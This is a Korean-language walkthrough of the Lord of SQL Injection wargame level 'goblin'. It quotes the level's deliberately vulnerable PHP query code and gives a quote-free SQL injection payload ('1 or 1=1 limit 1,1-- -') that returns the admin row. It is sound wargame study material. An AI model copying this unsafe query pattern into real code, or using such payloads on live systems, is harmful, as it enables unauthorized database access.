# Lord of SQL Injection No.3 - goblin
## 문제 출제 의도
따옴표 없이 SQL문을 조작 할 수 있는지 확인한다.
## 소스 코드 분석
+ 소스코드
~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
    if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
    $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("goblin");
    highlight_file(__FILE__); 
?>
~~~
+ 소스 코드 분석<hr>
~~~
 if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
 if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~");
~~~
+ <p>Get 방식으로 no를 받으며 만약 입력된 값 중에 prob, _, ., (, )이 하나라도 있으면 No Hack ~_~ 이 출력된다.</p>
+ 또한 입력 받은 값 중에 ', ", `이 하나라도 있다면 No Quotes ~_~이 출력된다.

~~~
$query = "select id from prob_goblin where id='guest' and no={$_GET[no]}";
~~~
+ 입력받은 no가 query문에 안에 들어감으로 SQL Injection 공격이 가능한걸 알 수 있다.

~~~
if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
~~~
+ 만약 데이터베이스에서 받아온 id에 0 이 아닌 것이 들어 있다면 Hello 와 그 값을 출력한다.

~~~
if($result['id'] == 'admin') solve("goblin");
~~~
+ 만약 데이터베이스에서 받아온 id의 값이 'admin'이라면 문제 풀이에 성공한다.
## 문제 해결
+ 풀이 방법 <hr>
 **Get**방식으로 값을 입력받기 때문에 URL 다음에 다음과 같이 쿼리 스트링을 추가하면 된다.
    ~~~
    ?no=1 or 1=1 limit 1,1-- -
    ~~~
    즉 where문을 무효화 시킨 다음 전체 값 중 2번째 행의 값만 가져오는 것이다.
    ?no=-1 or 1=1 을 입력하면 hello admin이라고 나오는데 이후 limit 값을 증가시켜 데이터베이스에는 3개의 행이 있다는 정보를 알수 있고 그 중 2번째 행의 id 값이 admin인 것을 알 수 있다.
    
    따라서 결과적으로 쿼리가
    ~~~
    select id from prob_goblin where id='guest' and no=-1 or 1=1 limit 1,1-- -
    ~~~
    이 되어 문제풀이에 성공한다.